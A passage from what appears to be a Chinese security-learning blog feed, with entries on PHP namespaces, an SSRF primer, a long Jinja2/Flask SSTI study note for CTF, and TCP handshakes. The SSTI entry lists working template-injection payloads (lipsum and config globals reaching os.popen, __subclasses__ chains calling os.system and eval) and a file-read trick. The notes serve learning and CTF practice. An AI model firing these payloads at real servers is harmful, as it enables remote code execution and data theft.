<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;你的php文件名（假设是存放有namespace的文件）&#x27;</span>;<span class="comment">//include可以导入文件，后面要有单引号</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">world</span>\<span class="title">TEST</span>\<span class="title">test</span> <span class="title">as</span> <span class="title">test1</span> ；</span><br><span class="line"><span class="title">use</span> <span class="title">hello</span>\<span class="title">test</span> <span class="title">as</span> <span class="title">test2</span>；// 这个时候已经用<span class="title">as</span>更换名字了，那么接下来的运行就可以分清楚了</span><br><span class="line">$<span class="title">a</span>= <span class="title">new</span> <span class="title">test1</span>();</span><br><span class="line">$a -&gt; train();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果不想更改类名，那么就需要把方法所属的空间以及类都写下来以示区别。</p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF注入</title>
    <url>/2021/03/26/SSRF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。<a id="more"></a></p>
<h2 id="相关危险函数"><a href="#相关危险函数" class="headerlink" title="相关危险函数"></a>相关危险函数</h2><p><strong>1.函数</strong><br><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p>
<p>（1）.<code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p>
<p>（2）.<code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
<p>（3）.<code>curl_exec</code>函数用于执行指定的cURL会话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">2.file_get_contents的gopher协议不能URL编码</span><br><span class="line">3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">5.curl_exec() &#x2F;&#x2F;默认不跟踪跳转，</span><br><span class="line">6.file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议</span><br></pre></td></tr></table></figure>

<p><strong>2.协议</strong><br>（1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br>（2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>（3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>（4）<code>http/s</code>：探测内网主机存活</p>
<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p><a href="https://blog.csdn.net/qq_39101049/article/details/102501839">https://blog.csdn.net/qq_39101049/article/details/102501839</a></p>
]]></content>
  </entry>
  <entry>
    <title>ssti注入绕过深入了解</title>
    <url>/2021/04/08/SSTI%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前学的ssti注入看了一下只是停留在很表层的学习，感觉已经不能适应现在ctf的难度，故决定深入学习payload构造绕过的方式，掌握python编写语法:Flask/Jinja2<a id="more"></a></p>
<h2 id="ssti注入步骤"><a href="#ssti注入步骤" class="headerlink" title="ssti注入步骤"></a>ssti注入步骤</h2><p><strong>确定模板类型——&gt;选择对应注入语句</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Flask&#x2F;Jingjia2</span><br><span class="line"></span><br><span class="line">作为 web层面的攻击,我们要关注语言层面的特性和绕过Flask&#x2F;Jinja2 模板的语法,filters和内建函数,变量,都可能称为绕过的trick</span><br><span class="line"></span><br><span class="line">基本语法如下:</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;</span><br><span class="line">  &#123;&#123; ... &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for [Expressions](https:&#x2F;&#x2F;jinja.palletsprojects.com&#x2F;en&#x2F;2.11.x&#x2F;templates&#x2F;#expressions) 里面可以是一个表达式,如1+1,字符串等,支持调用对象的方法,会渲染结果</span><br></pre></td></tr></table></figure>



<ul>
<li><pre><code>&#123;% ... %&#125;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-  for [Statements](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-control-structures) ,可以实现for,if等语句,还支持set语法,可以给变量赋值

这里的
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
&#123;&#123;&#125;&#125;
​```

自然不必说，用来执行命令，&#123;%%&#125;我突然有了点感觉，他可以给变量赋值，这不就说明了我们使用拼凑法吗，就是先单独对每个过滤项进行赋值，然后将其拼接起来就行。

### 基础语法

#### 变量

应用把变量传递给模板，可以使用(.)来访问变量的属性，作为替代，也可以使用所谓的下标语法([])

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">&#123;&#123;foo.bar&#125;&#125;</span><br><span class="line">&#123;&#123;foo[&#39;bar&#39;]&#125;&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br></pre></td></tr></table></figure>



#### 过滤器

变量可以通过过滤器修改。
过滤器与变量用**管道符号(|)分割**，并且也可以用圆括号传递可选参数。
**多个过滤器可以链式调用，前一个过滤器的输出会被作为后一个过滤器的输入。**
举例：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &#123;&#123; name|striptags|title &#125;&#125; 会移除 name 中的所有 HTML 标签并且改写 为标题样式的大小写格式。过滤器接受带圆括号的参数，如同函数调用。这个例子会 把一个列表用逗号连接起来: &#123;&#123; list|join(&#39;, &#39;) &#125;&#125; 。</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">#### 空白控制</span><br><span class="line"></span><br><span class="line">默认配置中，模板引擎不会对空白做进一步修改，所以每个空白（空格、制表符、换行符 等等），配置了trim_blocks，模板标签后的第一个换行符会被自动移除</span><br><span class="line">防止-</span><br><span class="line">此外，你也可以手动剥离模板中的空白。当你在块（比如一个 for 标签、一段注释或变 量表达式）的开始或结束放置一个减号（ &#96;-&#96; ），可以移除块前或块后的空白:</span><br><span class="line"></span><br><span class="line">**标签和减号之间不能有空白**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% - if foo - %&#125;...&#123;% endif %&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br></pre></td></tr></table></figure>



#### 行语句

如果应用启用了行语句，就可以把一个行标记为一个语句。例如如果行语句前缀配置为#，下面的例子就是等价的。

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line"># for item in seq</span><br><span class="line">    &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line"># endfor</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for item in seq %&#125;</span><br><span class="line">    &lt;li&gt;&#123;&#123; item &#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure>

**PS:**1.若有未闭合的圆括号、花括号或方括号，行语句可以跨越多行:

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># for href, caption in [(&#39;index.html&#39;, &#39;Index&#39;),</span><br><span class="line">                        (&#39;about.html&#39;, &#39;About&#39;)]:</span><br></pre></td></tr></table></figure>

**2.**##为行注释前缀，行中所有##之后的内容(不包括换行符)会被忽略:

#### 转义

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.当从模板中生成HTML时，变量可能包含影响已生成的HTML的字符。有两种解决方法：手动转义每个字符或默认自动转义所有的东西。</span><br><span class="line">2.使用手动转义</span><br><span class="line">转义通过用管道传递到过滤器|e来实现:</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;user.username|e&#125;&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">#### 过滤器</span><br><span class="line"></span><br><span class="line">#### 赋值</span><br><span class="line"></span><br><span class="line">在代码块中，你也可以为为变量赋值。在顶层的（块、宏、循环之间）赋值是可导出的，即可以从别的模板中导入。</span><br><span class="line"></span><br><span class="line">赋值使用set标签，并且可以为多个变量赋值:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% set navigation &#x3D; [(&#39;index.html&#39;, &#39;Index&#39;), (&#39;about.html&#39;, &#39;About&#39;)] %&#125;</span><br><span class="line">&#123;% set key, value &#x3D; call_something() %&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### 表达式</span><br><span class="line"></span><br><span class="line">jinjia中导入都允许使用基本表达式。这像常规的python一样工作。</span><br><span class="line"></span><br><span class="line">#### 字面量</span><br><span class="line"></span><br><span class="line">&quot;HELLO&quot;：</span><br><span class="line">双引号或单引号中间的一切都是字符串，无论何时你需要在模板中使用一个字符串(比如函数调用、过滤器或只是包含或继承一个模板的参数)。他们都是有用的。</span><br><span class="line"></span><br><span class="line">42&#x2F;42.23:</span><br><span class="line">直接写下数值就可以创建整数和浮点数。如果有小数点，则为浮点数，否则为整数，在python中，42和42.0是不一样的</span><br><span class="line">**dict:**</span><br><span class="line">python 中的字典是一种关联键和值的结构。键必须是唯一的，并且键必须只有一个值，字典在模板中很少使用，罕用于**xmlattr()**过滤器之类</span><br><span class="line">**PS**所有的true和false都是小写的</span><br><span class="line"></span><br><span class="line">#### 算式</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;</span><br><span class="line">  Jinja 允许你用计算值。这在模板中很少用到，但是为了完整性允许其存在。支持下面的 运算符:</span><br><span class="line">  </span><br><span class="line">  - +</span><br><span class="line">  </span><br><span class="line">    把两个对象加到一起。通常对象是素质，但是如果两者是字符串或列表，你可以用这 种方式来衔接它们。无论如何这不是首选的连接字符串的方式！连接字符串见 &#96;~&#96; 运算符。 </span><br><span class="line">  </span><br></pre></td></tr></table></figure>
    `&#123;&#123; 1 + 1 &#125;&#125;`
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line">   等于 &#96;2&#96; 。</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;</span><br><span class="line">  -</span><br></pre></td></tr></table></figure>

用第一个数减去第二个数。 
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
`&#123;&#123; 3 - 2 &#125;&#125;`
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure>
  -  等于 `1` 。

  - /

    对两个数做除法。返回值会是一个浮点数。
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure>
 `&#123;&#123; 1 / 2 &#125;&#125;` 
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure>
  - 等于 `&#123;&#123; 0.5 &#125;&#125;` 。

  - //

    对两个数做除法，返回整数商。 `&#123;&#123; 20 // 7 &#125;&#125;` 等于 `2` 。

  - %

    计算整数除法的余数。 `&#123;&#123; 11 % 7 &#125;&#125;` 等于 `4` 。

  - *

    用右边的数乘左边的操作数。 `&#123;&#123; 2 * 2 &#125;&#125;` 会返回 `4` 。也可以用于重 复一个字符串多次。 `&#123;&#123; ‘=’ * 80 &#125;&#125;` 会打印 80 个等号的横条。

  - **

    取左操作数的右操作数次幂。 `&#123;&#123; 2**3 &#125;&#125;` 会返回 `8` 。
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">#### 比较</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;</span><br><span class="line">  - &#x3D;&#x3D;</span><br><span class="line">  </span><br><span class="line">    比较两个对象是否相等。</span><br><span class="line">  </span><br><span class="line">  - !&#x3D;</span><br><span class="line">  </span><br><span class="line">    比较两个对象是否不等。</span><br><span class="line">  </span><br><span class="line">  - &gt;</span><br><span class="line">  </span><br><span class="line">    如果左边大于右边，返回 true 。</span><br><span class="line">  </span><br><span class="line">  - &gt;&#x3D;</span><br><span class="line">  </span><br><span class="line">    如果左边大于等于右边，返回 true 。</span><br><span class="line">  </span><br><span class="line">  - &lt;</span><br><span class="line">  </span><br><span class="line">    如果左边小于右边，返回 true 。</span><br><span class="line">  </span><br><span class="line">  - &lt;&#x3D;</span><br><span class="line">  </span><br><span class="line">    如果左边小于等于右边，返回 true 。</span><br></pre></td></tr></table></figure>



</code></pre>
</li>
</ul>
<h4 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于 if 语句，在 for 过滤或 if 表达式中，它可以用于联合多个表达式:</span><br><span class="line"></span><br><span class="line">- and</span><br><span class="line"></span><br><span class="line">  如果左操作数和右操作数同为真，返回 true 。</span><br><span class="line"></span><br><span class="line">- or</span><br><span class="line"></span><br><span class="line">  如果左操作数和右操作数有一个为真，返回 true 。</span><br><span class="line"></span><br><span class="line">- not</span><br><span class="line"></span><br><span class="line">  对一个表达式取反（见下）。</span><br><span class="line"></span><br><span class="line">- (expr)</span><br><span class="line"></span><br><span class="line">  表达式组。</span><br><span class="line"></span><br><span class="line">提示</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is&#96; 和 &#96;in&#96; 运算符同样支持使用中缀记法: &#96;foo is not bar&#96; 和 &#96;foo not in bar&#96; 而不是 &#96;not foo is bar&#96; 和 &#96;not foo in bar&#96; 。所有的 其它表达式需要前缀记法 &#96;not (foo and bar)</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">#### 其它运算符</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;</span><br><span class="line">  下面的运算符非常有用，但不适用于其它的两个分类:</span><br><span class="line">  </span><br><span class="line">  - in</span><br><span class="line">  </span><br><span class="line">    运行序列&#x2F;映射包含检查。如果左操作数包含于右操作数，返回 true 。比如 &#96;&#123;&#123; 1 in [1,2,3] &#125;&#125;&#96; 会返回 true 。</span><br><span class="line">  </span><br><span class="line">  - is</span><br><span class="line">  </span><br><span class="line">    运行一个 [*测试*](http:&#x2F;&#x2F;docs.jinkan.org&#x2F;docs&#x2F;jinja2&#x2F;templates.html#tests) 。</span><br><span class="line">  </span><br><span class="line">  - |**重点**</span><br><span class="line">  </span><br><span class="line">    应用一个 [*过滤器*](http:&#x2F;&#x2F;docs.jinkan.org&#x2F;docs&#x2F;jinja2&#x2F;templates.html#filters) 。</span><br><span class="line">  </span><br><span class="line">  - ~</span><br><span class="line">  </span><br><span class="line">    把所有的操作数转换为字符串，并且连接它们。 &#96;&#123;&#123; &quot;Hello &quot; ~ name ~ &quot;!&quot; &#125;&#125;&#96; 会返回（假设 name 值为 &#96;&#39;&#39;John&#39;&#96; ） &#96;Hello John!&#96; 。</span><br><span class="line">  </span><br><span class="line">  - ()</span><br><span class="line">  </span><br><span class="line">    调用一个可调用量:&#96;&#123;&#123; post.render() &#125;&#125;&#96; 。在圆括号中，你可以像在 python 中一样使用位置参数和关键字参数: &#96;&#123;&#123; post.render(user, full&#x3D;true) &#125;&#125;&#96; 。</span><br><span class="line">  </span><br><span class="line">  - #### . &#x2F; []</span><br><span class="line">  </span><br><span class="line">    获取一个对象的属性。</span><br></pre></td></tr></table></figure>



<h3 id="内置过滤器清单"><a href="#内置过滤器清单" class="headerlink" title="内置过滤器清单"></a>内置过滤器清单</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**abs(number):**返回参数的绝对值</span><br><span class="line">**attr(obj,name):**获取对象的属性。foo|attr(&quot;bar&quot;)的工作方式类似于foo[&quot;bar&quot;]，只是总是返回一个属性，并且不查找任何项。</span><br><span class="line">**join（value，d&#x3D;u&quot;,attribute&#x3D;None）**:</span><br><span class="line">返回一个字符串，该字符串是系列中字符串的串联，元素之间的分隔符默认情况下是一个空字符串，您可以使用可选参数对其进行定义:</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [1, 2, 3]|join(&#39;|&#39;) &#125;&#125;</span><br><span class="line">    -&gt; 1|2|3</span><br><span class="line"></span><br><span class="line">&#123;&#123; [1, 2, 3]|join &#125;&#125;</span><br><span class="line">    -&gt; 123</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">并且可以连接对象的某些属性:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; users|join(&#39;, &#39;, attribute&#x3D;&#39;username&#39;) &#125;&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">**last(seq)**:返回序列最后的一个元素:</span><br><span class="line">**length(object)：**返回序列中的项目数</span><br><span class="line">**list(value):**将值转换为列表。如果是字符串，则返回的列表将是字符列表。</span><br><span class="line">**random(seq):**从序列中返回一个随机项目</span><br><span class="line">**select():**可以用来选择对象:</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; numbers|select(&quot;odd&quot;) &#125;&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">**selectattr():**</span><br><span class="line">这个可以用来选择需要的object</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int()：将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()：字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length&#x3D;255,killwords&#x3D;False)：截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#39;&lt;em&gt;hello&lt;&#x2F;em&gt;&#39;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()：将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()：返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#39;Hello?&#39;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()：返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line">pop(): 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值，在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean&#x3D;false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean&#x3D;False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean&#x3D;true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br><span class="line">​&#96;&#96;&#96;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx&#x2F;a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line">__doc__:使用docstrings，每个对象都有自己的.__doc__属性，调用__doc__即为调用其文档字符串</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc\self\fd&#x2F;3&#39;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation&#x2F;x-www-form-urlencoded或multipart&#x2F;form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a&#x2F;b)</span><br><span class="line">request.json		 post传json  (Content-Type: application&#x2F;json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考:<a href="https://blog.csdn.net/xiaolong22333/article/details/114228433">https://blog.csdn.net/xiaolong22333/article/details/114228433</a><br><a href="http://ctf.ieki.xyz/library/ssti.html">http://ctf.ieki.xyz/library/ssti.html</a><br><a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters">https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters</a></p>
<h3 id="fuzz脚本结果（前辈整理）"><a href="#fuzz脚本结果（前辈整理）" class="headerlink" title="fuzz脚本结果（前辈整理）"></a>fuzz脚本结果（前辈整理）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>TCP三次握手</title>
    <url>/2021/01/28/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/</url>
    <content><![CDATA[<h2 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h2><p><a href="https://blog.csdn.net/qzcsu/article/details/72861891%E8%BF%99%E9%87%8C%E6%9C%89%E6%AD%A3%E7%BB%8F%E8%A7%A3%E9%87%8A">https://blog.csdn.net/qzcsu/article/details/72861891这里有正经解释</a>        <a id="more"></a><br>通俗来说是:”让我知道你已经知道了”<br><strong>解释</strong>:客户端先发送请求报文给服务端，服务端收到报文后，也发送一个自己的确认报文（其中会包含请求报文中的内容）给客户端，客户端收到确认报文后，再发送确认收到报文给服务端(也包含服务端确认报文的信息)，接下来两者正式建立连接</p>
<h2 id="TCP四次挥手"><a href="#TCP四次挥手" class="headerlink" title="TCP四次挥手"></a>TCP四次挥手</h2><p><strong>解释</strong>：客户端发送终止报文给服务端，服务端收到报文后先回复一次，说它已经收到了，如果手头上没工作，那么再回复一次，如果手头上有工作，就等手头上的工作做完了，再回复，客户端收到第一次回复时，先不做反应，等收到第二次回复(fin信号)回复的时候，再回复一个确认信号，服务端收到这个最终释放确认信号的时候，就停止工作了，而客户端还要2*MSL（最长报文段寿命）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。</p>
<p>为什么要经过最长报文段寿命再终止呢?:<br>如果客户端最后的确认释放信号没有丢失，那么服务端将不会再回复，如果客户端最后的确认释放信号丢失，那么服务端将会重新回复让客户端再发送一次确认释放信号，这个时间就是用来确认释放信号是否丢失的。</p>
]]></content>
      <tags>
        <tag>html原理</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP函数</title>
    <url>/2020/10/14/PHP%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a>PHP函数</h3><p>php函数的准则<br>1.函数的名称应该提示出它的功能<br>2.函数名称以字母或下划线开头<br><strong>这边先介绍一个function自定义函数</strong><br>格式是                                                                     <a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">a</span>(<span class="params"></span>)//<span class="title">a</span>你想定义的函数的名称</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   该程序所要执行的指令；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>举个例子</p>
